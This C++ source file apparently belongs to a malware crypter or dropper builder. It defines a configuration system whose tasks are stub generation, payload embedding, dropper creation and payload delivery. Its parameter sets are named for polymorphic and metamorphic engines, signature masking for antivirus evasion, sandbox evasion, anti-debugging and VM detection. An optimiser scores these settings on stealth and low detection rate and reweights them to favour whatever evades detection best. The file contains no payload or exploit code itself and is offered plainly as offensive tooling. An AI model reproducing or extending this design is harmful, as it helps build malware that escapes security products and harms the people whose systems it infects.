#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <map>
#include <memory>
#include <chrono>
#include <random>
#include <algorithm>
#include <thread>
#include <mutex>
#include <functional>
#include <cstdint>
#include <ctime>
#include <set>

class LeafConfigurationSystem {
public:
    enum class TaskType {
        ENCRYPTION,
        STUB_GENERATION,
        PAYLOAD_EMBEDDING,
        DROPPER_CREATION,
        OBFUSCATION,
        PAYLOAD_DELIVERY
    };

    struct EffectivenessMetrics {
        double executionTime = 0.0;
        double memoryUsage = 0.0;
        double detectionRate = 0.0;
        double successRate = 0.0;
        double stealthScore = 0.0;
        double overallEffectiveness = 0.0;
        
        void calculateOverall() {
            overallEffectiveness = (successRate * 0.4) + 
                                 (stealthScore * 0.3) + 
                                 ((1.0 - detectionRate) * 0.2) + 
                                 ((1.0 / (executionTime + 1.0)) * 0.1);
        }
    };

    struct ConfigurationLeaf {
        std::string leafId;
        std::string category;
        std::map<std::string, std::string> parameters;
        std::map<std::string, int> intParameters;
        std::map<std::string, double> doubleParameters;
        std::map<std::string, bool> boolParameters;
        EffectivenessMetrics metrics;
        int usageCount = 0;
        double weight = 1.0;
        std::chrono::system_clock::time_point lastUsed;
        std::set<TaskType> compatibleTasks;
        
        ConfigurationLeaf(const std::string& id, const std::string& cat) 
            : leafId(id), category(cat) {
            lastUsed = std::chrono::system_clock::now();
        }
    };

    struct LeafCluster {
        std::string clusterId;
        std::vector<std::shared_ptr<ConfigurationLeaf>> leaves;
        TaskType primaryTask;
        double clusterEffectiveness = 0.0;
        
        LeafCluster(const std::string& id, TaskType task) : clusterId(id), primaryTask(task) {}
    };

private:
    std::map<std::string, std::shared_ptr<ConfigurationLeaf>> allLeaves;
    std::map<TaskType, std::shared_ptr<LeafCluster>> taskClusters;
    std::map<TaskType, std::vector<std::string>> activeLeafSets;
    std::mt19937_64 rng;
    mutable std::mutex configMutex;
    
    // Effectiveness tracking
    std::map<std::string, std::vector<EffectivenessMetrics>> leafMetricsHistory;
    std::map<TaskType, std::map<std::string, EffectivenessMetrics>> taskSpecificLeafMetrics;
    
    // Self-analysis components
    std::chrono::high_resolution_clock::time_point lastAnalysis;
    int analysisInterval = 50;
    int operationCount = 0;
    
public:
    LeafConfigurationSystem() {
        initializeRNG();
        initializeLeaves();
        initializeClusters();
        lastAnalysis = std::chrono::high_resolution_clock::now();
    }
    
    void initializeRNG() {
        std::random_device rd;
        auto now = std::chrono::high_resolution_clock::now();
        auto duration = now.time_since_epoch();
        auto nanos = std::chrono::duration_cast<std::chrono::nanoseconds>(duration).count();
        
        std::seed_seq seed{
            rd(), rd(), rd(), rd(),
            static_cast<unsigned int>(std::time(nullptr)),
            static_cast<unsigned int>(nanos),
            static_cast<unsigned int>(nanos >> 32),
            static_cast<unsigned int>(std::hash<std::thread::id>{}(std::this_thread::get_id()))
        };
        
        rng.seed(seed);
    }
    
    void initializeLeaves() {
        // Encryption leaves
        createEncryptionLeaves();
        
        // Obfuscation leaves
        createObfuscationLeaves();
        
        // Performance leaves
        createPerformanceLeaves();
        
        // Stealth leaves
        createStealthLeaves();
        
        // Memory optimization leaves
        createMemoryLeaves();
        
        // Detection avoidance leaves
        createDetectionLeaves();
    }
    
    void createEncryptionLeaves() {
        // AES variants
        auto aes256_leaf = std::make_shared<ConfigurationLeaf>("aes256_cbc", "encryption");
        aes256_leaf->parameters["algorithm"] = "AES256_CBC";
        aes256_leaf->intParameters["key_length"] = 256;
        aes256_leaf->intParameters["rounds"] = 14;
        aes256_leaf->doubleParameters["strength"] = 0.9;
        aes256_leaf->compatibleTasks = {TaskType::ENCRYPTION, TaskType::OBFUSCATION};
        allLeaves["aes256_cbc"] = aes256_leaf;
        
        auto aes192_leaf = std::make_shared<ConfigurationLeaf>("aes192_ctr", "encryption");
        aes192_leaf->parameters["algorithm"] = "AES192_CTR";
        aes192_leaf->intParameters["key_length"] = 192;
        aes192_leaf->intParameters["rounds"] = 12;
        aes192_leaf->doubleParameters["strength"] = 0.8;
        aes192_leaf->compatibleTasks = {TaskType::ENCRYPTION, TaskType::DROPPER_CREATION};
        allLeaves["aes192_ctr"] = aes192_leaf;
        
        auto chacha_leaf = std::make_shared<ConfigurationLeaf>("chacha20", "encryption");
        chacha_leaf->parameters["algorithm"] = "ChaCha20";
        chacha_leaf->intParameters["rounds"] = 20;
        chacha_leaf->doubleParameters["speed"] = 0.9;
        chacha_leaf->compatibleTasks = {TaskType::ENCRYPTION, TaskType::PAYLOAD_DELIVERY};
        allLeaves["chacha20"] = chacha_leaf;
        
        auto xor_leaf = std::make_shared<ConfigurationLeaf>("xor_advanced", "encryption");
        xor_leaf->parameters["algorithm"] = "XOR_ADVANCED";
        xor_leaf->intParameters["key_rotation"] = 8;
        xor_leaf->doubleParameters["speed"] = 0.95;
        xor_leaf->compatibleTasks = {TaskType::ENCRYPTION, TaskType::PAYLOAD_DELIVERY};
        allLeaves["xor_advanced"] = xor_leaf;
    }
    
    void createObfuscationLeaves() {
        auto poly_leaf = std::make_shared<ConfigurationLeaf>("polymorphic_engine", "obfuscation");
        poly_leaf->boolParameters["runtime_mutation"] = true;
        poly_leaf->intParameters["mutation_depth"] = 15;
        poly_leaf->doubleParameters["complexity"] = 0.85;
        poly_leaf->compatibleTasks = {TaskType::STUB_GENERATION, TaskType::OBFUSCATION};
        allLeaves["polymorphic_engine"] = poly_leaf;
        
        auto meta_leaf = std::make_shared<ConfigurationLeaf>("metamorphic_code", "obfuscation");
        meta_leaf->boolParameters["code_transformation"] = true;
        meta_leaf->intParameters["transform_cycles"] = 10;
        meta_leaf->doubleParameters["complexity"] = 0.9;
        meta_leaf->compatibleTasks = {TaskType::PAYLOAD_EMBEDDING, TaskType::OBFUSCATION};
        allLeaves["metamorphic_code"] = meta_leaf;
        
        auto control_flow_leaf = std::make_shared<ConfigurationLeaf>("control_flow_flatten", "obfuscation");
        control_flow_leaf->boolParameters["flatten_enabled"] = true;
        control_flow_leaf->intParameters["flatten_depth"] = 12;
        control_flow_leaf->doubleParameters["effectiveness"] = 0.75;
        control_flow_leaf->compatibleTasks = {TaskType::PAYLOAD_EMBEDDING, TaskType::STUB_GENERATION};
        allLeaves["control_flow_flatten"] = control_flow_leaf;
        
        auto dead_code_leaf = std::make_shared<ConfigurationLeaf>("dead_code_insertion", "obfuscation");
        dead_code_leaf->boolParameters["insert_dead_code"] = true;
        dead_code_leaf->intParameters["dead_code_ratio"] = 30;
        dead_code_leaf->doubleParameters["stealth_boost"] = 0.6;
        dead_code_leaf->compatibleTasks = {TaskType::PAYLOAD_EMBEDDING, TaskType::OBFUSCATION};
        allLeaves["dead_code_insertion"] = dead_code_leaf;
    }
    
    void createPerformanceLeaves() {
        auto inline_leaf = std::make_shared<ConfigurationLeaf>("inline_optimization", "performance");
        inline_leaf->boolParameters["inline_functions"] = true;
        inline_leaf->intParameters["inline_threshold"] = 100;
        inline_leaf->doubleParameters["speed_gain"] = 0.8;
        inline_leaf->compatibleTasks = {TaskType::PAYLOAD_DELIVERY, TaskType::DROPPER_CREATION};
        allLeaves["inline_optimization"] = inline_leaf;
        
        auto compression_leaf = std::make_shared<ConfigurationLeaf>("data_compression", "performance");
        compression_leaf->boolParameters["compress_data"] = true;
        compression_leaf->intParameters["compression_level"] = 7;
        compression_leaf->doubleParameters["size_reduction"] = 0.7;
        compression_leaf->compatibleTasks = {TaskType::PAYLOAD_DELIVERY, TaskType::ENCRYPTION};
        allLeaves["data_compression"] = compression_leaf;
        
        auto caching_leaf = std::make_shared<ConfigurationLeaf>("result_caching", "performance");
        caching_leaf->boolParameters["enable_caching"] = true;
        caching_leaf->intParameters["cache_size"] = 1024;
        caching_leaf->doubleParameters["hit_ratio"] = 0.85;
        caching_leaf->compatibleTasks = {TaskType::ENCRYPTION, TaskType::OBFUSCATION};
        allLeaves["result_caching"] = caching_leaf;
    }
    
    void createStealthLeaves() {
        auto entropy_leaf = std::make_shared<ConfigurationLeaf>("entropy_injection", "stealth");
        entropy_leaf->boolParameters["inject_entropy"] = true;
        entropy_leaf->intParameters["entropy_layers"] = 8;
        entropy_leaf->doubleParameters["randomness"] = 0.95;
        entropy_leaf->compatibleTasks = {TaskType::ENCRYPTION, TaskType::STUB_GENERATION};
        allLeaves["entropy_injection"] = entropy_leaf;
        
        auto timing_leaf = std::make_shared<ConfigurationLeaf>("timing_variation", "stealth");
        timing_leaf->boolParameters["randomize_timing"] = true;
        timing_leaf->intParameters["variance_ms"] = 500;
        timing_leaf->doubleParameters["detection_avoidance"] = 0.7;
        timing_leaf->compatibleTasks = {TaskType::PAYLOAD_DELIVERY, TaskType::DROPPER_CREATION};
        allLeaves["timing_variation"] = timing_leaf;
        
        auto signature_leaf = std::make_shared<ConfigurationLeaf>("signature_masking", "stealth");
        signature_leaf->boolParameters["mask_signatures"] = true;
        signature_leaf->intParameters["mask_layers"] = 5;
        signature_leaf->doubleParameters["av_evasion"] = 0.8;
        signature_leaf->compatibleTasks = {TaskType::STUB_GENERATION, TaskType::OBFUSCATION};
        allLeaves["signature_masking"] = signature_leaf;
    }
    
    void createMemoryLeaves() {
        auto streaming_leaf = std::make_shared<ConfigurationLeaf>("streaming_processing", "memory");
        streaming_leaf->boolParameters["stream_mode"] = true;
        streaming_leaf->intParameters["buffer_size"] = 4096;
        streaming_leaf->doubleParameters["memory_efficiency"] = 0.9;
        streaming_leaf->compatibleTasks = {TaskType::ENCRYPTION, TaskType::PAYLOAD_DELIVERY};
        allLeaves["streaming_processing"] = streaming_leaf;
        
        auto pool_leaf = std::make_shared<ConfigurationLeaf>("memory_pooling", "memory");
        pool_leaf->boolParameters["use_pools"] = true;
        pool_leaf->intParameters["pool_size"] = 2048;
        pool_leaf->doubleParameters["allocation_speed"] = 0.85;
        pool_leaf->compatibleTasks = {TaskType::OBFUSCATION, TaskType::PAYLOAD_EMBEDDING};
        allLeaves["memory_pooling"] = pool_leaf;
        
        auto compact_leaf = std::make_shared<ConfigurationLeaf>("compact_representation", "memory");
        compact_leaf->boolParameters["compact_mode"] = true;
        compact_leaf->intParameters["compression_ratio"] = 70;
        compact_leaf->doubleParameters["space_saving"] = 0.8;
        compact_leaf->compatibleTasks = {TaskType::PAYLOAD_DELIVERY, TaskType::DROPPER_CREATION};
        allLeaves["compact_representation"] = compact_leaf;
    }
    
    void createDetectionLeaves() {
        auto api_leaf = std::make_shared<ConfigurationLeaf>("api_obfuscation", "detection");
        api_leaf->boolParameters["obfuscate_apis"] = true;
        api_leaf->intParameters["obfuscation_rounds"] = 6;
        api_leaf->doubleParameters["detection_reduction"] = 0.75;
        api_leaf->compatibleTasks = {TaskType::STUB_GENERATION, TaskType::DROPPER_CREATION};
        allLeaves["api_obfuscation"] = api_leaf;
        
        auto sandbox_leaf = std::make_shared<ConfigurationLeaf>("sandbox_evasion", "detection");
        sandbox_leaf->boolParameters["evade_sandbox"] = true;
        sandbox_leaf->intParameters["evasion_techniques"] = 4;
        sandbox_leaf->doubleParameters["success_rate"] = 0.8;
        sandbox_leaf->compatibleTasks = {TaskType::DROPPER_CREATION, TaskType::PAYLOAD_DELIVERY};
        allLeaves["sandbox_evasion"] = sandbox_leaf;
        
        auto debug_leaf = std::make_shared<ConfigurationLeaf>("anti_debug", "detection");
        debug_leaf->boolParameters["anti_debug_enabled"] = true;
        debug_leaf->intParameters["debug_checks"] = 8;
        debug_leaf->doubleParameters["protection_level"] = 0.85;
        debug_leaf->compatibleTasks = {TaskType::OBFUSCATION, TaskType::STUB_GENERATION};
        allLeaves["anti_debug"] = debug_leaf;
        
        auto vm_leaf = std::make_shared<ConfigurationLeaf>("vm_detection", "detection");
        vm_leaf->boolParameters["detect_vm"] = true;
        vm_leaf->intParameters["vm_checks"] = 6;
        vm_leaf->doubleParameters["detection_accuracy"] = 0.9;
        vm_leaf->compatibleTasks = {TaskType::DROPPER_CREATION, TaskType::PAYLOAD_DELIVERY};
        allLeaves["vm_detection"] = vm_leaf;
    }
    
    void initializeClusters() {
        // Create clusters for each task type
        for (auto taskType : {TaskType::ENCRYPTION, TaskType::STUB_GENERATION, 
                             TaskType::PAYLOAD_EMBEDDING, TaskType::DROPPER_CREATION,
                             TaskType::OBFUSCATION, TaskType::PAYLOAD_DELIVERY}) {
            
            std::string clusterId = taskTypeToString(taskType) + "_cluster";
            auto cluster = std::make_shared<LeafCluster>(clusterId, taskType);
            
            // Add compatible leaves to cluster
            for (const auto& [leafId, leaf] : allLeaves) {
                if (leaf->compatibleTasks.count(taskType) > 0) {
                    cluster->leaves.push_back(leaf);
                }
            }
            
            taskClusters[taskType] = cluster;
            
            // Initialize active leaf set for this task
            selectInitialLeaves(taskType);
        }
    }
    
    void selectInitialLeaves(TaskType taskType) {
        auto& cluster = taskClusters[taskType];
        std::vector<std::string> selectedLeaves;
        
        // Select a balanced initial set of leaves
        std::map<std::string, int> categoryCount;
        
        for (const auto& leaf : cluster->leaves) {
            categoryCount[leaf->category]++;
        }
        
        // Select 1-2 leaves from each category
        std::map<std::string, int> selectedByCategory;
        
        for (const auto& leaf : cluster->leaves) {
            if (selectedByCategory[leaf->category] < 2) {
                selectedLeaves.push_back(leaf->leafId);
                selectedByCategory[leaf->category]++;
            }
        }
        
        activeLeafSets[taskType] = selectedLeaves;
        
        std::cout << "[LEAF INIT] Task " << taskTypeToString(taskType) 
                  << " initialized with " << selectedLeaves.size() << " leaves" << std::endl;
    }
    
    // Core configuration methods
    void configureForTask(TaskType taskType) {
        std::lock_guard<std::mutex> lock(configMutex);
        
        // Self-analysis trigger
        if (shouldTriggerAnalysis()) {
            performSelfAnalysis();
        }
        
        // Optimize leaf selection for this task
        optimizeLeafSelection(taskType);
        
        operationCount++;
        
        std::cout << "[LEAF CONFIG] Configured for " << taskTypeToString(taskType) 
                  << " with " << activeLeafSets[taskType].size() << " active leaves" << std::endl;
    }
    
    void optimizeLeafSelection(TaskType taskType) {
        auto& activeLeaves = activeLeafSets[taskType];
        auto& cluster = taskClusters[taskType];
        
        // Calculate effectiveness scores for all compatible leaves
        std::vector<std::pair<double, std::string>> leafScores;
        
        for (const auto& leaf : cluster->leaves) {
            double score = calculateLeafScore(leaf->leafId, taskType);
            leafScores.push_back({score, leaf->leafId});
        }
        
        // Sort by score (descending)
        std::sort(leafScores.begin(), leafScores.end(), std::greater<>());
        
        // Select top performing leaves, ensuring category diversity
        std::vector<std::string> newActiveSet;
        std::map<std::string, int> categoryUsed;
        
        for (const auto& [score, leafId] : leafScores) {
            auto leaf = allLeaves[leafId];
            if (categoryUsed[leaf->category] < 3 && newActiveSet.size() < 8) {
                newActiveSet.push_back(leafId);
                categoryUsed[leaf->category]++;
            }
        }
        
        // Ensure minimum set size
        if (newActiveSet.size() < 4) {
            for (const auto& [score, leafId] : leafScores) {
                if (std::find(newActiveSet.begin(), newActiveSet.end(), leafId) == newActiveSet.end()) {
                    newActiveSet.push_back(leafId);
                    if (newActiveSet.size() >= 4) break;
                }
            }
        }
        
        activeLeafSets[taskType] = newActiveSet;
    }
    
    double calculateLeafScore(const std::string& leafId, TaskType taskType) {
        auto leaf = allLeaves[leafId];
        
        // Base score from leaf metrics
        double score = leaf->metrics.overallEffectiveness;
        
        // Task-specific adjustments
        if (taskSpecificLeafMetrics[taskType].count(leafId) > 0) {
            score = taskSpecificLeafMetrics[taskType][leafId].overallEffectiveness;
        }
        
        // Usage-based adjustment (favor proven leaves)
        if (leaf->usageCount > 0) {
            score += 0.1 * std::min(1.0, leaf->usageCount / 10.0);
        }
        
        // Freshness factor (slightly favor recently used leaves)
        auto timeSinceUse = std::chrono::system_clock::now() - leaf->lastUsed;
        auto hoursSinceUse = std::chrono::duration_cast<std::chrono::hours>(timeSinceUse).count();
        if (hoursSinceUse < 24) {
            score += 0.05;
        }
        
        // Weight factor
        score *= leaf->weight;
        
        return std::max(0.0, std::min(1.0, score));
    }
    
    // Performance tracking
    void recordTaskPerformance(TaskType taskType, const EffectivenessMetrics& metrics) {
        std::lock_guard<std::mutex> lock(configMutex);
        
        EffectivenessMetrics updatedMetrics = metrics;
        updatedMetrics.calculateOverall();
        
        // Update metrics for all active leaves
        for (const std::string& leafId : activeLeafSets[taskType]) {
            auto leaf = allLeaves[leafId];
            
            // Update leaf usage
            leaf->usageCount++;
            leaf->lastUsed = std::chrono::system_clock::now();
            
            // Update leaf metrics (running average)
            if (leaf->metrics.overallEffectiveness == 0.0) {
                leaf->metrics = updatedMetrics;
            } else {
                leaf->metrics.executionTime = (leaf->metrics.executionTime + updatedMetrics.executionTime) / 2.0;
                leaf->metrics.memoryUsage = (leaf->metrics.memoryUsage + updatedMetrics.memoryUsage) / 2.0;
                leaf->metrics.detectionRate = (leaf->metrics.detectionRate + updatedMetrics.detectionRate) / 2.0;
                leaf->metrics.successRate = (leaf->metrics.successRate + updatedMetrics.successRate) / 2.0;
                leaf->metrics.stealthScore = (leaf->metrics.stealthScore + updatedMetrics.stealthScore) / 2.0;
                leaf->metrics.calculateOverall();
            }
            
            // Store in historical data
            leafMetricsHistory[leafId].push_back(updatedMetrics);
            
            // Update task-specific metrics
            taskSpecificLeafMetrics[taskType][leafId] = updatedMetrics;
        }
        
        // Update cluster effectiveness
        updateClusterEffectiveness(taskType);
        
        std::cout << "[LEAF METRICS] Updated performance for " << activeLeafSets[taskType].size() 
                  << " leaves in task " << taskTypeToString(taskType) << std::endl;
    }
    
    void updateClusterEffectiveness(TaskType taskType) {
        auto& cluster = taskClusters[taskType];
        double totalEffectiveness = 0.0;
        int activeCount = 0;
        
        for (const std::string& leafId : activeLeafSets[taskType]) {
            totalEffectiveness += allLeaves[leafId]->metrics.overallEffectiveness;
            activeCount++;
        }
        
        if (activeCount > 0) {
            cluster->clusterEffectiveness = totalEffectiveness / activeCount;
        }
    }
    
    // Self-analysis and optimization
    bool shouldTriggerAnalysis() {
        auto now = std::chrono::high_resolution_clock::now();
        auto timeSinceLastAnalysis = std::chrono::duration_cast<std::chrono::minutes>(now - lastAnalysis).count();
        
        return (operationCount >= analysisInterval) || (timeSinceLastAnalysis >= 15);
    }
    
    void performSelfAnalysis() {
        std::cout << "[LEAF ANALYSIS] Performing leaf effectiveness analysis..." << std::endl;
        
        // Analyze individual leaf performance
        analyzeLeafPerformance();
        
        // Optimize leaf weights based on performance
        optimizeLeafWeights();
        
        // Rebalance active leaf sets
        rebalanceActiveSets();
        
        lastAnalysis = std::chrono::high_resolution_clock::now();
        operationCount = 0;
        
        std::cout << "[LEAF ANALYSIS] Analysis complete. System optimized." << std::endl;
    }
    
    void analyzeLeafPerformance() {
        std::cout << "[LEAF ANALYSIS] Individual leaf performance:" << std::endl;
        
        for (const auto& [leafId, leaf] : allLeaves) {
            if (leaf->usageCount > 0) {
                std::cout << "  " << leafId << " (" << leaf->category << "): "
                          << "Score=" << leaf->metrics.overallEffectiveness
                          << ", Usage=" << leaf->usageCount
                          << ", Weight=" << leaf->weight << std::endl;
            }
        }
    }
    
    void optimizeLeafWeights() {
        // Adjust weights based on performance
        for (auto& [leafId, leaf] : allLeaves) {
            if (leaf->usageCount >= 3) {
                if (leaf->metrics.overallEffectiveness > 0.8) {
                    leaf->weight = std::min(2.0, leaf->weight * 1.1);
                } else if (leaf->metrics.overallEffectiveness < 0.4) {
                    leaf->weight = std::max(0.5, leaf->weight * 0.9);
                }
            }
        }
    }
    
    void rebalanceActiveSets() {
        for (auto taskType : {TaskType::ENCRYPTION, TaskType::STUB_GENERATION, 
                             TaskType::PAYLOAD_EMBEDDING, TaskType::DROPPER_CREATION,
                             TaskType::OBFUSCATION, TaskType::PAYLOAD_DELIVERY}) {
            
            optimizeLeafSelection(taskType);
        }
    }
    
    // Configuration access methods
    std::vector<std::string> getActiveLeaves(TaskType taskType) const {
        std::lock_guard<std::mutex> lock(configMutex);
        
        if (activeLeafSets.count(taskType) > 0) {
            return activeLeafSets.at(taskType);
        }
        return {};
    }
    
    std::shared_ptr<ConfigurationLeaf> getLeaf(const std::string& leafId) const {
        std::lock_guard<std::mutex> lock(configMutex);
        
        if (allLeaves.count(leafId) > 0) {
            return allLeaves.at(leafId);
        }
        return nullptr;
    }
    
    template<typename T>
    T getParameter(const std::string& leafId, const std::string& key, T defaultValue = T{}) const {
        std::lock_guard<std::mutex> lock(configMutex);
        
        if (allLeaves.count(leafId) == 0) return defaultValue;
        
        const auto& leaf = allLeaves.at(leafId);
        
        if constexpr (std::is_same_v<T, std::string>) {
            auto it = leaf->parameters.find(key);
            return (it != leaf->parameters.end()) ? it->second : defaultValue;
        } else if constexpr (std::is_same_v<T, int>) {
            auto it = leaf->intParameters.find(key);
            return (it != leaf->intParameters.end()) ? it->second : defaultValue;
        } else if constexpr (std::is_same_v<T, double>) {
            auto it = leaf->doubleParameters.find(key);
            return (it != leaf->doubleParameters.end()) ? it->second : defaultValue;
        } else if constexpr (std::is_same_v<T, bool>) {
            auto it = leaf->boolParameters.find(key);
            return (it != leaf->boolParameters.end()) ? it->second : defaultValue;
        }
        
        return defaultValue;
    }
    
    // Utility methods
    std::string taskTypeToString(TaskType taskType) const {
        switch(taskType) {
            case TaskType::ENCRYPTION: return "ENCRYPTION";
            case TaskType::STUB_GENERATION: return "STUB_GENERATION";
            case TaskType::PAYLOAD_EMBEDDING: return "PAYLOAD_EMBEDDING";
            case TaskType::DROPPER_CREATION: return "DROPPER_CREATION";
            case TaskType::OBFUSCATION: return "OBFUSCATION";
            case TaskType::PAYLOAD_DELIVERY: return "PAYLOAD_DELIVERY";
            default: return "UNKNOWN";
        }
    }
    
    // Status and debugging methods
    void printStatus() const {
        std::lock_guard<std::mutex> lock(configMutex);
        
        std::cout << "\n=== LEAF CONFIGURATION SYSTEM STATUS ===" << std::endl;
        std::cout << "Total Leaves: " << allLeaves.size() << std::endl;
        std::cout << "Total Operations: " << operationCount << std::endl;
        std::cout << "Last Analysis: " << std::chrono::duration_cast<std::chrono::minutes>(
            std::chrono::high_resolution_clock::now() - lastAnalysis).count() << " minutes ago" << std::endl;
        
        std::cout << "\nActive Leaf Sets by Task:" << std::endl;
        for (const auto& [taskType, leafSet] : activeLeafSets) {
            std::cout << "  " << taskTypeToString(taskType) << ": ";
            for (const auto& leafId : leafSet) {
                std::cout << leafId << " ";
            }
            std::cout << "(" << leafSet.size() << " leaves)" << std::endl;
        }
        
        std::cout << "\nCluster Effectiveness:" << std::endl;
        for (const auto& [taskType, cluster] : taskClusters) {
            std::cout << "  " << taskTypeToString(taskType) << ": " 
                      << cluster->clusterEffectiveness << std::endl;
        }
        
        std::cout << "=========================================\n" << std::endl;
    }
};

// Global instance for easy access
static LeafConfigurationSystem g_leafConfig;